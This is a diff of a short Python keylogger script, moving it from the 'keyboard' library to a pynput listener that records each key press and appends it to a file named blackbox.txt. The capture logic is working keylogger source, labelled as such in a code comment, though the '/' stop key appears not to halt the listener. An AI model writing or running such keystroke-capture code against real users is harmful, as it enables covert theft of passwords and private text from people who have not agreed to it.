@@ -1,5 +1,6 @@
 import os
-import keyboard  # for keylogs
+from pynput import keyboard
+import time
 
 # Use a string to store the captured keyboard input
 key_logs = ""
@@ -11,33 +12,36 @@ end_logging_flag = False
 end_logging_key = "/"
 
 # Define the path to the log file
-log_file_path = os.path.join(os.getcwd(), 'logs.txt')
+log_file_path = os.path.join(os.getcwd(), 'blackbox.txt')
 
 def report(logs):
     """
-    Writes the contents of the keyboard logs to a text file named 'logs.txt'.
+    Writes the contents of the keyboard logs to a text file named 'blackbox.txt'.
     """
     with open(log_file_path, 'a') as f:  # Use 'a' (append) mode to add to the file
         f.write(logs)
 
-print("Press '/' key to end logging.")
-keyboard.wait(end_logging_key)  # Wait for the '/' key press to end logging
+def on_key_press(key):
+    global key_logs
+    global end_logging_flag
+    
+    try:
+        key_name = key.char
+    except AttributeError:
+        key_name = str(key)
 
-# Capture keyboard input
-keyboard.start_recording()
-
-while True:
-    if keyboard.is_pressed(end_logging_key):
+    if key_name == end_logging_key:
         end_logging_flag = True
-        break
+    else:
+        key_logs += key_name
 
-# Get the recorded keyboard events
-events = keyboard.stop_recording()
+def on_key_release(key):
+    pass
 
-# Process the events and append to key_logs
-for event in events:
-    if event.event_type == keyboard.KEY_UP:
-        key_logs += event.name
+# Create a listener for keyboard events
+with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
+    print("Press '/' key to end logging.")
+    listener.join()
 
 # After logging is finished, write the key logs horizontally
 key_logs = ''.join(filter(str.isalpha, key_logs))
